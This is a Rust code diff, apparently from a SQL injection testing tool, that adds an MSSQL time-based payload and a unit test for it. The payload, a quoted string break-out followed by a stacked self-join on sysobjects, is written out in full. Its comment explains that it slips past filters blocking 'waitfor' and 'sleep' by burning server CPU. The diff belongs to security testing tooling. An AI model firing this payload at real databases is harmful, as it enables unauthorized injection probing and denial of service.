@@ -28,6 +28,16 @@ pub fn mssql_time_conditional(secs: u64) -> String {
     )
 }
 
+/// Heavy-query variant without `WAITFOR` (P0-5): blocked-keyword stacks
+/// that reject `waitfor`/`sleep` still run catalog cartesian joins. A
+/// `sysobjects` self-join multiplies rows quadratically, burning seconds
+/// of CPU. Fixed cost (catalog-size dependent); caller keeps `sleep_secs`
+/// for threshold math, same contract as the MySQL fixed `BENCHMARK`.
+#[must_use]
+pub fn mssql_time_heavy() -> String {
+    "'; SELECT COUNT(*) FROM sysobjects A, sysobjects B --".to_owned()
+}
+
 /// Canonical MSSQL error-based set — legacy first (compat), then variants.
 ///
 /// - `[0]` legacy `CONVERT(int,@@version)` — Msg 8114 channel
@@ -76,5 +86,15 @@ mod tests {
         let p = mssql_time_conditional(5);
         assert!(p.contains("IF(1=1)"), "{p}");
         assert!(p.contains("00:00:05"), "{p}");
+    }
+
+    #[test]
+    fn mssql_heavy_has_no_waitfor_keyword() {
+        // P0-5: catalog cartesian burn passes `waitfor`/`sleep` filters.
+        let p = mssql_time_heavy();
+        assert_eq!(p, "'; SELECT COUNT(*) FROM sysobjects A, sysobjects B --");
+        assert!(!p.to_ascii_lowercase().contains("waitfor"), "{p}");
+        assert!(!p.to_ascii_lowercase().contains("sleep"), "{p}");
+        assert!(p.starts_with("';"), "{p}");
     }
 }
